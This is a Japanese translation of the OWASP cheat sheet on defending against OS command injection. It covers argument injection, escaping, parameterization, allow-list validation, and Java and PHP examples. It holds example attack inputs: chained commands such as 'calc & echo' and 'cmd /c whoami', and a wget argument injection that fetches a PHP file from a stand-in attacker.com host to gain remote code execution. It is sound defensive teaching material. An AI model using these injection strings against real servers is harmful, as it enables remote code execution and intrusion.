# OSコマンドインジェクション防御チートシート 日本語訳

## Attribution

- Original: OS Command Injection Defense Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: Japanese translation added.
- Retrieved: 2026-05-21

## 日本語訳

# OSコマンドインジェクション防御チートシート

## はじめに

コマンドインジェクション (または OS コマンドインジェクション) は、外部から影響を受ける入力を使ってシステムコマンドを構築するソフトウェアが、本来意図されたコマンドを変更できる特殊要素を適切に無害化しない場合に発生するインジェクションの一種です。

たとえば、渡された値が次のとおりだったとします。

```bash
calc
```

これを Windows コマンドプロンプトで入力すると、*Calculator* アプリケーションが表示されます。

しかし、渡された値が改ざんされ、次のようになっている場合を考えます。

```bash
calc & echo "test"
```

実行時に、当初意図していた値の意味が変わります。

この結果、*Calculator* アプリケーションと値 *test* の両方が表示されます。

![CommandInjection](https://cheatsheetseries.owasp.org/assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)

侵害されたプロセスが最小権限の原則に従っておらず、攻撃者が制御するコマンドが特別なシステム権限で実行される場合、被害の範囲が広がるため問題はさらに深刻になります。

### 引数インジェクション

すべての OS コマンドインジェクションは、引数インジェクションでもあります。この種の攻撃では、特定のコマンドを実行する際に、ユーザー入力が引数として渡される可能性があります。

たとえば、ユーザー入力が `&`、`|`、`;` などの特定の文字をエスケープする関数を通される場合を考えます。

```php

system("curl " . escape($url));
```

これにより、攻撃者が別のコマンドを実行することは防止されます。

しかし、攻撃者が制御する文字列に `curl` コマンドの追加引数が含まれている場合を考えます。

```php

system("curl " . escape("--help"))
```

上記のコードが実行されると、`curl --help` の出力が表示されます。

使用されるシステムコマンドによっては、引数インジェクション攻撃の影響は **Information Disclosure** から重大な **Remote Code Execution** まで及ぶ可能性があります。

## 主な防御策

### 防御策 1: OS コマンドを直接呼び出さない

主な防御策は、OS コマンドを直接呼び出さないことです。組み込みライブラリ関数は OS コマンドの非常に良い代替手段です。意図された処理以外のタスクを実行するように操作されないためです。

たとえば、`system("mkdir /dir_name")` ではなく `mkdir()` を使用します。

使用している言語で利用可能なライブラリや API がある場合、この方法が推奨されます。

### 防御策 2: OS ごとに、OS コマンドへ追加される値をエスケープする

**TODO: To enhance.**

例として、PHP の [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) を参照してください。

`escapeshellarg()` はユーザー入力をシングルクォートで囲みます。そのため、不正なユーザー入力が `& echo "hello"` のようなものだった場合、最終的な出力は `calc '& echo "hello"'` のようになり、コマンド `calc` への単一の引数として解析されます。

`escapeshellarg()` は OS コマンドインジェクションを防ぎますが、それでも攻撃者はコマンドに単一の引数を渡すことができます。

### 防御策 3: パラメータ化と入力検証を組み合わせる

ユーザー指定値を含むシステムコマンドの呼び出しを避けられない場合、攻撃を防ぐために、ソフトウェア内で次の二層の防御を使用すべきです。

#### 第 1 層

**パラメータ化:** 利用可能な場合は、データとコマンドの分離を自動的に強制する構造化された仕組みを使用します。これらの仕組みは、適切なクォートやエンコーディングの提供に役立ちます。

#### 第 2 層

**入力検証:** コマンドと関連する引数の値は、どちらも検証する必要があります。実際のコマンドとその引数には、検証の程度に違いがあります。

- 使用される **コマンド** については、許可されたコマンドのリストと照合して検証する必要があります。
- これらのコマンドに使用される **引数** については、次の選択肢を使って検証すべきです。
    - **ポジティブ入力検証または許可リスト入力検証**: 許可される引数を明示的に定義します。
    - **許可リスト正規表現**: 良好で許可された文字のリストと、文字列の最大長を定義します。`Note A` で指定されているようなメタ文字や空白文字が正規表現に含まれないようにしてください。たとえば、次の正規表現は小文字と数字のみを許可し、メタ文字を含みません。また、長さも 3 から 10 文字に制限されています: `^[a-z0-9]{3,10}$`
- この [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html) の **Guideline 10** によれば、オプション引数ではない最初の `--` 引数は、オプションの終端を示す区切りとして受け入れるべきです。以降の引数は、たとえ `-` 文字で始まっていてもオペランドとして扱うべきです。たとえば、`curl -- $url` は、`$url` が不正で追加引数を含む場合でも、引数インジェクションを防ぎます。

**Note A:**

```text
& |  ; $ > < ` \ ! ' " ( )
```

## 追加の防御策

主な防御策、パラメータ化、入力検証に加えて、多層防御を実現するため、これらすべての追加防御策を採用することも推奨します。

追加防御策は次のとおりです。

- アプリケーションは、必要なタスクを実行するために必要な最小権限で実行すべきです。
- 可能であれば、単一のタスクにのみ使用する、権限を制限した分離アカウントを作成します。

## コード例

### Java

Java では [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) を使用し、コマンドとその引数を分離する必要があります。

*Java の `Runtime.exec` メソッドの挙動に関する注記:*

Java の `Runtime.exec` は `C` の system 関数とまったく同じだと説明しているサイトが多数あります。これは正しくありません。どちらも新しいプログラムまたはプロセスを起動できます。

しかし、`C` の system 関数は引数をシェル (`/bin/sh`) に渡して解析させます。一方、`Runtime.exec` は文字列を単語の配列に分割し、配列の最初の単語を実行し、残りの単語をパラメータとして渡そうとします。

**`Runtime.exec` はどの時点でもシェルを起動しようとせず、シェルメタ文字をサポートしません**。

重要な違いは、悪用に使われ得るシェルの多くの機能 (たとえば `&`、`&&`、`|`、`||` などを使ったコマンド連結、入力や出力のリダイレクト) が、単に最初のコマンドへ渡されるパラメータになってしまい、構文エラーになるか、無効なパラメータとして破棄される可能性が高いことです。

*上記の注記を検証するコード:*

```java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```

*テスト結果:*

```text
##### TEST CMD: java -version & cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version && cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version | cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version || cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST PAYLOAD ONLY: cmd /c whoami
RC    : 0
OUT   :
mydomain\simpleuser

ERROR :
```

*誤った使用例:*

```java
ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");
```

この例では、コマンドと引数が 1 つの文字列として渡されています。そのため、この式を操作して悪意のある文字列を注入しやすくなります。

*正しい使用例:*

次の例は、変更された作業ディレクトリでプロセスを開始します。コマンドと各引数は個別に渡されます。これにより、各要素を検証しやすくなり、悪意のある文字列が挿入されるリスクを低減できます。

```java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```

### .Net

関連する詳細は [DotNet Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#os-injection) を参照してください。

### PHP

PHP では、ユーザー入力をシェルに渡す必要がある場合に使える 2 つのヘルパー関数、`escapeshellarg()` と `escapeshellcmd()` が提供されています。

`escapeshellarg()`: ユーザーがコマンドへ 1 つのパラメータだけを渡せるようにし、追加パラメータの追加や別コマンドの実行を防ぎます。

`escapeshellcmd()`: ユーザーが意図されたコマンドだけを実行できるようにし、無制限のパラメータを渡せる一方で、他のコマンドの実行を防ぎます。

ユーザー入力を扱う場合は、常に `escapeshellcmd()` よりも `escapeshellarg()` を使用することが望ましいです。

たとえば、`wget` と `escapeshellcmd()` を使う次のコードを考えます。

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));
```

ユーザーが次の値を提供した場合を考えます。

```text
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```

`escapeshellcmd()` はこの追加パラメータを依然として許容します。つまり、攻撃者は元の `--directory-prefix` オプションを上書きし、ファイルを現在のディレクトリに保存させ、その後サーバー上でリモートコマンド実行を達成できます。

安全なアプローチは、URL が単一の引数として扱われるように `escapeshellarg()` を使用することです。

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);
```

これにより、悪意のある入力は次のようになります。

```text
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```

ここでは、2 つ目の `--directory-prefix` はクォートされた文字列の一部であり、実際のオプションではないため、攻撃は失敗します。

さらに、次の推奨事項に従うことはセキュリティ上の良いプラクティスです。

- **コマンドをハードコードする**: 実行する実行ファイルをユーザーに選択させてはいけません。
- **オプションをハードコードする**: 必須フラグ (例: `--directory-prefix`) はユーザー入力ではなく、コード内に置くべきです。
- **入力を可能な限り検証し制限する**: 厳格な検証ルール、許可リスト、形式チェックを適用し、攻撃対象領域を最小化します。

## 関連記事

### コマンドインジェクション脆弱性の説明

- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)。

### 脆弱性を避ける方法

- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)。

### コードレビューの方法

- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection)。

### テスト方法

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) の [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html) に関する記事。

### 外部参照

- [CWE Entry 77 on Command Injection](https://cwe.mitre.org/data/definitions/77.html)。

## ASVS との対応

| ASVS 項目 | 関連内容 |
| --- | --- |
| V1.2 | OS コマンドインジェクション防御チートシートの主要な管理策 |
